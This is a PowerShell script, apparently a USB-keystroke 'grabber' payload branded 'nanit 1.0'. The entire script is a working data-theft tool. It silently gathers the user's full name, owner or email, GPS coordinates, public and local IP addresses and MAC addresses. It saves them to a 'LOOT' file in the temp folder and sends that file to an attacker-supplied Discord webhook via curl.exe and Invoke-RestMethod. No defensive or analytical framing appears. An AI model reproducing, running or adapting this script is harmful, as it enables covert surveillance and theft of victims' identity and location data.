$FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"

#------------------------------------------------------------------------------------------------------------------------------------

function Get-fullName {

    try {
    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$fullName = Get-fullName


#------------------------------------------------------------------------------------------------------------------------------------

function Get-email {
    
    try {

    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
    return $email
    }

# If no email is detected function will return backup message for sapi speak

    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "No Email Detected"
    -ErrorAction SilentlyContinue
    }        
}

$email = Get-email

#------------------------------------------------------------------------------------------------------------------------------------


try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
catch{$computerPubIP="Error getting Public IP"}



$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String

$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String

#------------------------------------------------------------------------------------------------------------------------------------

function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
	$GeoWatcher.Start() #Begin resolving current locaton

	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 #Wait for discovery.
	}  

	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
		$GL = $GL -split " "
		$Lat = $GL[0].Substring(11) -replace ".$"
		$Lon = $GL[1].Substring(10) -replace ".$" 
		return $Lat, $Lon


	}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    return "No Coordinates found"
    -ErrorAction SilentlyContinue
    } 

}

$Lat, $Lon = Get-GeoLocation

#------------------------------------------------------------------------------------------------------------------------------------

$output = @"

############################################################################################################################################################                      
#                                 ⠭⠵⠖⠀⠀⠀⠀⠀⠀⠀⠠⠀⠠⠀⡠⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠄⠠⠀⠀⠀⠀⠀
#                                  ⠂⠀⠀⠀⠀⠀⢀⡀⠀⠀⠁⢠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠠⠀⠀⠔⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⡀⠉⠳⢦⣀⠀⠀⠀⠁⠀⠈⣐⠲⠶
#            nanit                  ⠀⣀⠠⣒⣼⡵⠋⠀⠀⠀⡴⢃⠀⠀⠀⠀⠀⢀⠐⠀⠀⠀⠀⠀⠀⠈⠀⠁⠀⠀⠣⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠂⡀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠈⠑⠦⣀⠀⠀⠀⠐⠁⠢
#             1.0                 ⡶⠞⠊⣽⡵⠟⠁⠀⠀⣀⡞⠀⠀⠀⠀⠀⠀⡠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠈⠀⠑⢄⠀⠀⠀⠀⠉⠒⠤⢀⠀⠀
#                                  ⣠⢟⠟⠁⠀⠀⢀⠄⡼⢀⠀⠀⢠⠀⠀⡔⠀⠠⢀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢀⠁⠢⡀⠀⠀⠠⢀⣀⠀⠀
#                                 ⡼⠡⠂⠀⠀⣀⡴⡱⢊⠁⠀⠀⠀⠂⠀⡜⠀⣆⢠⣼⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠀⠀⠀⠀⡀⡀⠀⢦⡀⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⠣⡐⢄⡑⠂⠀⠀⢹⣿⢟
#                                 ⠀⠁⢀⠤⢊⠏⡰⢁⠊⠀⠄⠀⠀⠀⢰⠃⠘⢨⣽⣿⠀⣸⠀⠀⢻⠀⠀⠀⠀⠀⠀⠀⠐⠀⠤⡀⠀⠣⠂⠀⠀⢆⠀⠀⠐⡄⠀⠁⠂⢢⠀⠀⠀⠀⢀⠑⣄⠀⠀⠻⣦⡈⠢⠈⠢⣀⠢⡀⢣⠑
#                                 ⣠⠔⠁⠠⠂⠐⡡⠃⢀⠔⠀⠀⠀⠀⡎⠀⡇⡞⣿⣿⠀⢿⣼⢠⣸⣇⠀⠘⣤⡀⠀⢃⣆⠐⡌⣶⠄⠀⢷⣀⠀⠈⢷⣄⡠⠽⣴⡀⠀⠳⡃⠀⠀⠈⠪⢢⡈⢵⣄⠀⠹⡷⡄⠀⢡⡙⢇⠠⠀⢣
#                                 ⠁⠀⠀⠀⠰⡴⠁⠀⠙⠀⡄⠀⡄⢀⠇⢀⢁⣿⣿⣿⡾⡞⣿⢸⣿⡿⡄⠀⢹⢳⠀⠘⡼⣆⢸⣼⣿⣦⠈⢿⣧⠀⠈⢿⣷⣄⠹⣧⡀⠀⠙⣄⠠⡀⠀⠈⢳⣄⢻⣷⣤⡙⣌⢦⡀⢳⣮⡳⣤⠀
#                                  ⠀⠀⢀⡖⠁⠀⠀⠀⠸⠀⠐⠇⡀⢀⣾⣼⣿⣿⣿⣿⣧⣿⡆⣿⣷⣷⡀⠈⣿⣧⠀⢷⣏⢦⢹⣼⡿⣷⣌⢟⢷⡄⠘⣿⣿⣦⡙⣷⡀⡀⠘⣄⠩⣂⠀⠸⣿⠿⠷⠀⢀⡝⠾⢟⢄⠻⡏⠛⠊
#                                   ⠀⡜⠑⠀⠀⠀⠀⠀⢀⠜⢠⠇⣿⣿⣿⡏⢹⢹⣿⣿⣿⣽⣿⡟⣿⣷⠀⢹⣿⢧⢸⣿⡀⣳⣯⢷⣟⣿⣯⣿⣻⣦⣹⣍⣿⣿⣾⣷⣄⠀⠺⣆⠹⣦⣷⣽⣰⣦⣀⠹⣧⠀⢸⣾⣏⠙⠄⠀
#                                   ⢠⠅⠀⠀⠀⠀⠀⠀⡞⠀⡜⢰⢹⣿⢻⣇⠀⠈⣿⣿⣿⣾⣿⣇⠻⡇⢣⢸⣿⠈⢧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⣿⠿⣿⡿⣿⣿⣦⡀⠣⠣⡸⢷⣽⣿⣞⢿⠀⢻⠀⠀⣏⢿⡄⠀⠀
#                                  ⠀⠈⠀⠀⠀⠀⠀⠀⢰⠁⢀⠁⣸⣿⡁⠆⢻⣆⠀⠙⢿⣿⣿⣿⡈⠀⠻⡌⢻⣏⠆⠼⢿⠁⠀⢿⣿⣿⣿⣿⣿⡿⠁⠀⠈⣰⡟⠃⠀⣹⣿⣝⣠⣷⠉⢢⡝⠘⢻⠟⠀⣼⠀⠀⣿⢦⢻⡄⠀
#                                       ⠀⠀⠀⡆⠀⣼⠀⢸⣿⣷⠀⠀⠻⣦⡀⠀⠉⠉⠀⠁⠀⠀⠁⠈⠻⠀⠀⠈⠀⢀⠈⠙⠻⠿⠟⠋⠀⠀⣠⡾⠋⠀⠀⠐⢻⣿⡍⣽⡇⣀⠼⠑⡠⠐⢀⠌⠈⢀⡴⠋⠀⠈⠋⣄
#                                         ⠀⠃⠀⠀⠰⢸⠘⢹⣧⠀⠀⠈⠻⠷⡶⠤⠂⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣶⣶⣤⣤⣶⡶⠟⠋⠀⠠⠐⠀⠀⣸⣿⣇⣿⡿⠤⡤⠂⢀⡴⢃⣠⣾⡍⠀⠀⠀⠀⠀⠀
#                                           ⠀⠐⠀⠘⠀⢹⢿⡄⠀⠀⡆⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢲⣾⣿⣿⣿⣿⡶⠒⠀⠀⠈⠁⠐⢤⡀⠀⣿⣿⡿⢿⠴⠒⠒⢛⣴⢻⡋⠉⢿⡀⠀⠀⠀⠀⠀
#                                           ⠀⠀⠀⠀⠀⠘⠈⣷⢀⠐⠀⠀⠀⠀⠻⣭⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⠋⠉⠁⠀⠀⠀⡇⠀⠀⢠⣄⣤⣿⡇⠀⠀⠀⣠⡞⠹⠋⠸⠀⠀⠀⠁⠀⠀⠀⠀⠀
#                                       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡟⠃⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⣿⠀⠀⠰⠆⠀⠀⠁⠀⡀⣸⣿⣟⣿⣿⡷⣶⠏⣿⣧⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#                                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢦⡀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⠀⠀⢰⡇⠀⣀⣴⠟⠀⣿⣿⣿⣿⣿⣧⣿⢀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#               The quieter you become, ⠀⠀⠀⠀⠀⠀⠀⠀      ⠀⠙⠢⣄⠀⠀⠀⠀⠻⠯⠟⠳⠆⠀⠀⠀⠀⠀⠀⣼⠇⠀⣨⣵⠾⠋⠁⣠⣾⣿⣿⣿⣿⣿⡟⢻⣼⠉⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#             the more you are able to hear        ⠀⠀⠀⠀⠀⠀ ⠈⠻⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣾⣿⠛⣁⣤⣶⣿⣿⣿⣿⣿⣿⣿⠁⠁⠈⢿⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#                                           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣤⡀⠀⠀⠀⠀⣀⣤⣶⣿⣿⡿⣻⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#                                           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣶⣶⣶⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣈⠛⠷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#                                           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⡄⠀⠉⠳⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#                                           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠉⠀⢀⡀⠀⠠⠚⠙⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀
#                                           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠁⠀⠀⠀⠀⢠⠊⠀⠊⠀⠀⠠⠀⠈⠙⢲⡀⠀⠀⠀⠀⠀
#                                           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠼⢁⣴⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⡐⠀⠈⠀⠀⠀⠁⠀⠀⠀⠀⠈⣇⠀⠀⠀⠀⠀
#                                           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⢋⣴⠟⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀
#                                           ⠀⠀⠀⠀⠀⠀⠀⠀⣠⢏⡔⣻⠋⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠐⡀⠀⣤⣤⣲⡴⠖⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠀
#                                           ⠀⠀⠀⠀⠀⠀⢠⡖⡣⢋⡼⠃⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠄⠀⠀⣾⣷⣾⠿⠋⠀⠀⠀⡠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⣀⠀
#                                           ⠀⠀⠀⠀⠀⠀⣸⠟⣀⡞⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⡀⠀⠉⠛⠟⠀⠀⠀⠀⠚⢠⣴⢦⠴⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠬⣕
#                                           ⠀⠀⠀⠀⠀⢠⢃⢴⠏⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⡀⠀⠀⠁⠀⠀⠀⠀⣰⣴⣶⣿⠦⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#                                            ⠀⠀⠀⣰⢧⣾⠏⠀⠀⣴⠀⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⢰⣦⣴⠶⠀⠀⠀⠀⠀⠀⠀⠀⠙⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#                                            ⠀⠀⢰⣿⢫⠏⠀⠀⠘⣿⠀⠻⣿⣿⡿⠏⠀⠀⠐⠲⠃⠀⠀⠙⠉⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#                                           ⠀⠀⣰⡿⢁⡞⠀⠀⠀⣼⣿⣁⠀⠈⠉⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠐⠟⠁⠀⠔⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀                                                                                                                                                                                                                            
############################################################################################################################################################  

Full Name: $fullName

Email: $email

Location:
$Lat
$Lon
------------------------------------------------------------------------------------------------------------------------------
Public IP: 
$computerPubIP

Local IPs:
$localIP
MAC:
$MAC



$output > $FileName

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$FileName"}


#------------------------------------------------------------------------------------------------------------------------------------

